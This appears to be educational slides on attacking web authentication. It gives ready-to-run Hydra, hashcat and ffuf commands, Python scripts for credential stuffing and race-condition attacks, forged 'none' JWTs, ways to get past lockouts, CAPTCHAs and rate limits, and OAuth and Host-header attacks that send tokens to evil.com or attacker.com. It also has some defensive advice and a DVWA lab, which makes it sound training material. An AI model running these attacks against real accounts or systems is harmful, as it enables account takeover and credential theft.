# Brute-Forcing Logins & Implementation Flaws

## Automated Credential Attacks

---

## Brute-Force Attack Types

| Type | Description | Speed |
|------|-------------|-------|
| **Simple brute-force** | Try all combinations | Very slow |
| **Dictionary attack** | Use word list | Moderate |
| **Credential stuffing** | Use leaked credentials | Fast |
| **Password spraying** | One password, many users | Fast |
| **Hybrid** | Dictionary + rules | Moderate |
| **Rainbow tables** | Pre-computed hashes | Very fast |

---

## Dictionary Attack with Burp Intruder

```text
1. Capture login request in Burp Proxy
2. Send to Intruder (Ctrl+I)
3. Mark payload positions:
   username=§admin§&password=§password§
4. Choose attack type:
   - Sniper: Test one position at a time
   - Cluster Bomb: All combinations
5. Load payload lists:
   - Usernames: /usr/share/seclists/Usernames/top-usernames-shortlist.txt
   - Passwords: /usr/share/seclists/Passwords/Common-Credentials/top-100.txt
6. Start attack
7. Sort by response length/status to find valid creds
```

---

## Hydra - Command-Line Brute-Forcer

```bash
# HTTP POST form brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic auth
hydra -l admin -P wordlist.txt target.com http-get /admin/

# With username list
hydra -L users.txt -P passwords.txt \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Login failed"

# Rate limiting (1 request per second)
hydra -l admin -P wordlist.txt -t 1 -W 1 \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"
```

---

## Password Spraying

```bash
# Try ONE password against MANY users
# Avoids account lockout thresholds

# Common passwords to spray:
# Company2024!
# Welcome1!
# Password123
# Summer2024!
# [CompanyName]2024

# Using Burp Intruder - Pitchfork mode
# Position 1: Username list
# Position 2: Same password for all

# Using spray.sh
spray.sh -smb target.com users.txt passwords.txt 3 30
# 3 attempts, 30 minute lockout window

# Using hydra with timing
hydra -L users.txt -p 'Company2024!' \
  target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=failed" -t 1
```

---

## Credential Stuffing

```python
# Using leaked credential databases
# Attackers check if users reuse passwords across sites

# Example with Python + requests
import requests

with open('leaked_creds.txt') as f:
    for line in f:
        user, password = line.strip().split(':')
        resp = requests.post('https://target.com/login',
            data={'username': user, 'password': password})
        if 'Dashboard' in resp.text:
            print(f'[+] Valid: {user}:{password}')

# Scale: Millions of credentials tested
# Defense: Check passwords against breach databases
# https://haveibeenpwned.com/API/v3
```

---

## Bypassing Login Protections

```text
Protection: Account Lockout
Bypass:
  - Password spraying (stay under threshold)
  - Wait for lockout timer to reset
  - Try from different IPs

Protection: CAPTCHA
Bypass:
  - Look for CAPTCHA token in hidden field (reuse it)
  - Check if CAPTCHA is validated server-side
  - Use OCR tools (low accuracy for modern CAPTCHAs)
  - Check if API endpoint skips CAPTCHA

Protection: Rate Limiting
Bypass:
  - X-Forwarded-For header rotation
  - Distributed attack from multiple IPs
  - Add special characters: admin%00, admin%20
  - Use different parameter encoding
```

---

## IP-Based Bypass Techniques

```http
# Headers to try for IP spoofing
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1

# Some applications trust these headers
# for rate limiting decisions
# Rotate through different IPs to bypass
```

---

## CAPTCHA Bypass Techniques

```python
# Technique 1: Reuse CAPTCHA token
# Some implementations validate token only once
# Intercept valid token and reuse in multiple requests

# Technique 2: Empty CAPTCHA parameter
# Remove the captcha field entirely from the request
# Some servers only check if present, not if valid

# Technique 3: Predictable CAPTCHA
# Check if CAPTCHA answer is in:
#   - HTML source code
#   - HTTP response headers
#   - JavaScript variables

# Technique 4: Session-based CAPTCHA bypass
# CAPTCHA validated on different endpoint than login
# Skip the CAPTCHA verification step entirely
```

---

## Authentication Logic Flaws

```python
# Flaw 1: SQL Injection in login
# username: admin' --
# password: anything
# Query: SELECT * FROM users WHERE username='admin' --' AND password='anything'

# Flaw 2: Type juggling (PHP)
# password[]=  (send as array)
# strcmp(password, hash) returns NULL for array input
# NULL == 0 evaluates to TRUE in PHP

# Flaw 3: Default credentials left active
# admin:admin, admin:password, root:root
# Vendor-specific defaults (check defaultpasswords.com)

# Flaw 4: Authentication bypass via parameter manipulation
# POST /login -> Response includes: authenticated=false
# Change to: authenticated=true
# Or: role=user -> role=admin
```

---

## Race Condition in Authentication

```python
# Race condition: Multiple simultaneous requests
# can bypass rate limiting or lockout

import requests
import threading

def login_attempt(password):
    requests.post('https://target.com/login',
        data={'username': 'admin', 'password': password})

# Send 100 requests simultaneously
passwords = ['pass' + str(i) for i in range(100)]
threads = [threading.Thread(target=login_attempt, args=(p,))
           for p in passwords]

# Start all threads at nearly the same time
for t in threads:
    t.start()

# The lockout counter may not increment fast enough
# to block all simultaneous requests
```

---

## Response Analysis for Success Detection

```text
How to identify successful login in automated attacks:

1. Status Code Difference
   Failed: HTTP 200 (login page re-shown)
   Success: HTTP 302 (redirect to dashboard)

2. Response Length Difference
   Failed: 4523 bytes (error message)
   Success: 1204 bytes (redirect)

3. Response Content
   Failed: "Invalid credentials"
   Success: "Welcome, admin"

4. Set-Cookie Header
   Failed: No new cookies
   Success: Set-Cookie: session=new_value

5. Response Time
   Valid user + wrong pass: 200ms (hash check)
   Invalid user: 50ms (immediate reject)
```

---

## Password Hash Cracking

```bash
# If you obtain password hashes:

# Identify hash type
hashid '$2b$12$abc...'
# Output: bcrypt

# hashcat examples
# MD5
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# SHA-256
hashcat -m 1400 -a 0 hashes.txt wordlist.txt

# bcrypt
hashcat -m 3200 -a 0 hashes.txt wordlist.txt

# With rules (add numbers, special chars, etc.)
hashcat -m 0 -a 0 hashes.txt wordlist.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
```

---

## Token-Based Authentication Attacks

```python
# JWT - Algorithm Confusion Attack (None algorithm)
import base64
import json

# Original JWT: header.payload.signature
# Decode header
header = {"alg": "none", "typ": "JWT"}  # Changed from HS256 to none!

# Modify payload
payload = {"sub": "1234", "name": "admin", "role": "admin"}

# Encode without signature
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
forged_jwt = h.decode() + '.' + p.decode() + '.'

# If server doesn't validate algorithm, this JWT is accepted!

# JWT Brute-Force (weak secrets)
# Using jwt_tool:
# python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt

# Using hashcat:
# hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

---

## OAuth Token Theft

```text
Attack: Authorization Code Interception via Open Redirect

1. Attacker finds open redirect:
   https://target.com/redirect?url=https://evil.com

2. Attacker crafts OAuth URL with malicious redirect_uri:
   https://auth.provider.com/authorize?
     client_id=target_app&
     redirect_uri=https://target.com/redirect?url=https://evil.com&
     response_type=code&
     scope=openid+email

3. Victim clicks the link and authorizes
4. Auth server redirects to:
   https://target.com/redirect?url=https://evil.com&code=AUTH_CODE
5. Target.com redirects to:
   https://evil.com?code=AUTH_CODE
6. Attacker exchanges code for access token!

Defense:
  - Strict redirect_uri validation (exact match)
  - Use PKCE (Proof Key for Code Exchange)
  - Validate state parameter for CSRF
```

---

## Password Reset Token Attack Scenarios

```text
Scenario 1: Token in URL, leaked via Referer
  1. User requests password reset
  2. Email contains: https://target.com/reset?token=abc123
  3. User clicks link, reset page loads
  4. Page includes third-party resources (analytics, ads)
  5. Browser sends Referer: https://target.com/reset?token=abc123
  6. Third-party now has the reset token!

  Defense: Use POST with token in body, not GET URL

Scenario 2: Weak token generation
  Token = MD5(email + timestamp)
  Attacker knows email, guesses approximate timestamp
  Brute-force the token in seconds

  Defense: Use secrets.token_urlsafe(32)

Scenario 3: Token not invalidated after password change
  1. Request reset, get token
  2. Use token to reset password
  3. Token still works for another reset!

  Defense: Delete token after single use
```

---

## Account Takeover via Password Reset Poisoning

```http
# Host header poisoning attack on password reset

# Normal request:
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

# Server generates reset link using Host header:
# https://target.com/reset?token=secret_token_123

# Attack: Poison the Host header
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

# Server generates:
# https://attacker.com/reset?token=secret_token_123
# Victim clicks link, token sent to attacker!

# Defense:
# - Hardcode the domain in reset emails
# - Never use Host header for URL generation
# - Validate Host header against allowlist
```

---

## Implementation Flaws Checklist

```text
[ ] Password stored in plaintext or weak hash (MD5, SHA1)
[ ] Password sent over HTTP (no TLS)
[ ] Password visible in URL parameters
[ ] Password in server logs
[ ] No password complexity requirements
[ ] No protection against brute-force
[ ] Account lockout not implemented
[ ] Session not invalidated on password change
[ ] "Remember me" token is predictable
[ ] Password reset token doesn't expire
[ ] MFA can be skipped
[ ] Different error messages for valid/invalid users
[ ] Default credentials active
[ ] Backup authentication bypasses MFA
[ ] Password change doesn't require current password
```

---

## Lab: Brute-Force DVWA

```bash
# Step 1: Set DVWA to Low security
# Step 2: Intercept login in Burp
# Step 3: Send to Intruder

# Using Hydra against DVWA
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=xxx; security=low:F=Username and/or password incorrect"

# Using ffuf
ffuf -u "http://localhost:8080/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
  -w /usr/share/seclists/Passwords/Common-Credentials/top-100.txt \
  -H "Cookie: PHPSESSID=xxx; security=low" \
  -fr "incorrect"
```

---

## Summary

- Brute-force attacks remain effective against weak defenses
- Password spraying avoids lockout mechanisms
- Credential stuffing exploits password reuse
- Multiple bypass techniques exist for common protections
- Implementation flaws often provide easier paths than brute-force
- Race conditions can defeat rate limiting
- Always pair attack knowledge with defense recommendations

> Next: Securing Authentication
